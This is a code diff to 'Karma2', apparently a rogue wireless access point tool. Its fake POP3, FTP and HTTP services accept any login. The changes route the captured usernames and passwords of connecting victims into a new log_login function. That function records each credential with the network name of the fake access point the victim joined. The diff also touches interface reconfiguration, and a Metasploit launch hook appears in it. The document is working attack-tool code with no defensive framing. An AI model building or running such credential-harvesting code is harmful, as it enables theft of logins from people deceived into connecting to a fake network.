@@ -149,7 +149,8 @@ class Karma2:
 
       w('+OK POP3 server ready')
       log('POP3: Connexion')
-
+      user = {'uri':'pop3://??'}
+      client = self.client_address[0]
       while True:
         data = self.request.recv(1024)
 
@@ -164,17 +165,18 @@ class Karma2:
           w('RESP-CODES')
           w('UIDL')
           w('.')
-        
+        elif data.startswith('AUTH'):
+          w('-ERR not supported')
         elif data.startswith('USER'):
           w('+OK User accepted')
-          log('POP3: %s'%data)
+          user['login'] = data.split(' ')[1].strip()
 
         elif data.startswith('PASS'):
-          log('POP3: %s'%data)
           w('+OK Password accepted')
+          user['password'] = data.split(' ')[1].strip()
+          self.server.app.log_login(client, user)
 
         elif data.startswith('APOP'):
-          log('POP3: %s'%data)
           w('+OK')
 
         elif data.startswith('LIST'):
@@ -197,10 +199,15 @@ class Karma2:
 
         elif data.startswith('QUIT'):
           w('+OK')
+          break
 
   class POP3TCPServer(ThreadingMixIn, TCPServer):
     allow_reuse_address = True
     daemon_threads = True
+    
+    def __init__(self, address, handler, app):
+      self.app = app
+      TCPServer.__init__(self, address, handler)      
 
   class POP3Server(Thread):
     daemon=True
@@ -212,7 +219,7 @@ class Karma2:
     def run(self):
       log("[+] Starting POP3 server on port %d"%self.port)
       set_title('pop3server %s'%self.port)
-      server = Karma2.POP3TCPServer(('',self.port), Karma2.POP3TCPRequestHandler)
+      server = Karma2.POP3TCPServer(('',self.port), Karma2.POP3TCPRequestHandler, self.app)
       server.serve_forever()
       log("[%s] POP3 server on port %d is shutting down"%(_ctxt('x',RED),self.port))
 
@@ -232,6 +239,7 @@ class Karma2:
     
     def handle(self):
       client = self.client_address[0]
+      log('FTP: Connexion')
       self.respond(220, "FTP server")
       user = ''
       password = ''
@@ -245,7 +253,7 @@ class Karma2:
           self.respond(331, 'Please specify the password.')
         elif cmd == 'PASS':
           password = (args and args[0] or '*missing*')
-          log("ftp login from %s user: %s, password: %s"%(client, _ctxt(user,RED), _ctxt(password,RED)))
+          self.server.app.log_login(client, {'login': user, 'password': password, 'uri': 'ftp://??'})
           self.respond(230, 'Valid user.')
         elif cmd == 'PWD':
           self.respond(212, '/')
@@ -261,6 +269,10 @@ class Karma2:
   class FTPTCPServer(ThreadingMixIn, TCPServer):
     allow_reuse_address = True
     daemon_threads = True
+    
+    def __init__(self, address, handler, app):
+      TCPServer.__init__(self, address, handler)
+      self.app = app
 
   class FTPServer(Thread):
     daemon=True
@@ -272,7 +284,7 @@ class Karma2:
     def run(self):
       log("[+] Starting FTP server on port %d"%self.port)
       set_title('ftp server %s'%self.port)
-      server = Karma2.FTPTCPServer(('',self.port), Karma2.FTPTCPRequestHandler)
+      server = Karma2.FTPTCPServer(('',self.port), Karma2.FTPTCPRequestHandler, self.app)
       server.serve_forever()
       log("[%s] FTP server on port %d is shutting down"%(_ctxt('x',RED),self.port))
 
@@ -595,12 +607,11 @@ class Karma2:
         authorization = self.headers.get('Authorization').split(' ')
         if authorization[0] == 'Basic':
           user_password = base64.b64decode(authorization[1])
-          log( "%s login is %s"%(fullpath,_ctxt(user_password,RED)) )
           login,password = user_password.split(':')
           user = {'login':{'uri':fullpath,'login': login,  'password':password}}
-          self.server.app.update_login(user)
-      except:
-        pass
+          self.server.app.log_login(client, user)
+      except Exception as e:
+        print e
       
       # get content
       if self.headers.has_key('Content-Length'):
@@ -622,7 +633,7 @@ class Karma2:
             log( "%s login is %s"%(fullpath, 
               _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
             user = {'login':{'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}}
-            self.server.app.update_login(user)
+            self.server.app.log_login(client, user)
           except:
             raise
               
@@ -861,6 +872,10 @@ class Karma2:
           
           #clear route cache
           cmd = ["ip", "route", "del", self.subnet.range_null()]
+          p = subprocess.Popen(cmd)
+          p.wait()
+          
+          cmd = ["iwconfig", self.ifhostapd.str(), "mode", 'managed']
           p = subprocess.Popen(cmd)
           p.wait()
           
@@ -1227,6 +1242,15 @@ class Karma2:
         
     if metasploit is not None:
       self.start_metasploit(metasploit)
+  
+  def log_login(self, client, user):
+    client_ap = self.get_client_ap(client)
+    if client_ap is None:
+      client_ap = ''
+    else:
+      client_ap = client_ap.essid
+      
+    log('%s %s login: %s, password: %s, uri: %s'%(_ctxt('[*]', RED), _ctxt(client_ap, GREEN), _ctxt(user['login'], RED), _ctxt(user['password'], RED), _ctxt(user['uri'], RED)))
   
   def get_client_ap(self,ip):
     for essid,ap in self.aps.iteritems():
